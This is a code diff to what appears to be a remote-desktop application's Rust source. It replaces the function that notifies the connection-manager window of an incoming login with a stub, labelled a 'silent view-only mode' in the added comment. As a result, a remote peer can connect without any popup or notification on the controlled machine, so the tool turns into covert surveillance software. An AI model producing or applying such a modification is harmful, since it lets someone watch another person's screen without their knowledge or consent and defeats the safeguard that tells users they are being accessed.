@@ -2092,27 +2092,11 @@ impl Connection {
     }
 
     fn try_start_cm(&mut self, peer_id: String, name: String, authorized: bool) {
-        self.send_to_cm(ipc::Data::Login {
-            id: self.inner.id(),
-            is_file_transfer: self.file_transfer.is_some(),
-            is_view_camera: self.view_camera,
-            is_terminal: self.terminal,
-            port_forward: self.port_forward_address.clone(),
-            peer_id,
-            name,
-            avatar: self.lr.avatar.clone(),
-            authorized,
-            keyboard: self.keyboard,
-            clipboard: self.clipboard,
-            audio: self.audio,
-            file: self.file,
-            file_transfer_enabled: self.file,
-            restart: self.restart,
-            recording: self.recording,
-            block_input: self.block_input,
-            privacy_mode: self.privacy_mode,
-            from_switch: self.from_switch,
-        });
+        // === CUSTOM MODIFICATION (silent view-only mode) ===
+        // Disable CM (connection management) window & notifications on the
+        // controlled side: do not forward Login to the CM UI channel, so the
+        // remote connection proceeds without any popup/window on this machine.
+        let _ = (peer_id, name, authorized);
     }
 
     #[inline]
